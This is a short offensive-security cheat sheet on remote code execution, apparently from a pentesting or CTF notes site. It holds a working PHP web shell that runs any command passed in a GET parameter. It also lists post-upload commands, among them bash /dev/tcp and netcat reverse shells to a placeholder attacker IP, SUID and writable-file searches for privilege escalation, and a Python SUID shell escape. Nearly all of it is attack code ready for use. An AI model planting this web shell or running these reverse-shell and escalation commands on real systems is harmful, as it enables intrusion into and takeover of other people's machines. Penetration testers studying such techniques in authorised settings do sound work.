---
title: Remote Code Execution (RCE)
sidebar_position: 1
---

## Get shell (PHP)
```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```



**Commands to try after successful shell upload.**
- `whoami` - Prints the username.
- `pwd` - Prints working directory.
- `ls` - Lists all files in the directory.
- `uname -a` - Gives system information.
- `bash -i >& /dev/tcp/<your-ip>/<port> 0>&1` - Get reverse shell via bash.
- `nc -e /bin/sh <your-ip> <port>` - Get reverse shell via netcat.
- `find / -perm -4000 -type f 2>/dev/null` - Find SUID files. Useful for previlege escalation.
- `find / -writable -type  f 2>/dev/null | grep -v "/proc/"` - Find files with writable permissions. Useful for previlege escalation.

## GTFOBins
- GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

### Python
- SUID files.
    ```
    python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    ```
- Read more: https://gtfobins.github.io/gtfobins/python/